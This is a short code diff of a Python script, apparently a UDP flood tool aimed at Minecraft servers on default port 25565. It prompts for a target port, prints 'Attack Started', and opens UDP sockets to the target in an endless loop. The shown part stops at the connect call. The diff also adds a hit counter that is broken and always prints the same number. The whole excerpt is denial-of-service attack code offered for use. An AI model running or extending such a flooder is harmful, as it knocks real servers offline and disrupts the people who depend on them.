@@ -14,13 +14,12 @@ port = int(input('Port (Default: 25565) >> '))
 if port == 0:
 
       port = 25565
+print("Attack Started ☢️")
 
+print("Use CTRL+C to stop the Attack")
 while True:
-   
-   print("Attack Started ☢️")
-
-   print("Use CTRL+C to stop the Attack")
-
+   h = 1
+   print("Total Hits --> ", h+1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
    s.connect((ip, port))
